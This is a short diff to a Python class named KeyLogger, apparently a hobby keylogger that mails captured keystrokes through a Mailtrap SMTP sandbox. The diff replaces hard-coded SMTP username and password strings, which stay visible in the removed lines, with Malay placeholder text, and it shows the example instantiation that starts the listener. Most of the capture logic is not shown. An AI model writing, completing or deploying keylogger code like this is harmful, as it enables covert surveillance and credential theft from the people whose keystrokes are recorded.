@@ -45,8 +45,8 @@ class KeyLogger:
         """
         smtp_server = 'sandbox.smtp.mailtrap.io'
         smtp_port = 2525
-        smtp_user = 'ad158d66397208'
-        smtp_password = 'f97916e7fdb4f9'
+        smtp_user = 'masukkan username mailtrap'
+        smtp_password = 'masukkan password mailtrap'
 
         sender = "Ali Baba <from@siktauk.com>"
         receiver = "Kassim Baba <to@siktauk.com>"
@@ -87,5 +87,5 @@ From: {sender}
             keyboard_listener.join()
 
 # Example usage
-laksasarawak = KeyLogger(100, 'ad158d66397208', 'f97916e7fdb4f9')  # Initialize with Mailtrap credentials
+laksasarawak = KeyLogger(100, 'Username', 'Pssword')  #mailtrap username,pswd
 laksasarawak.start()
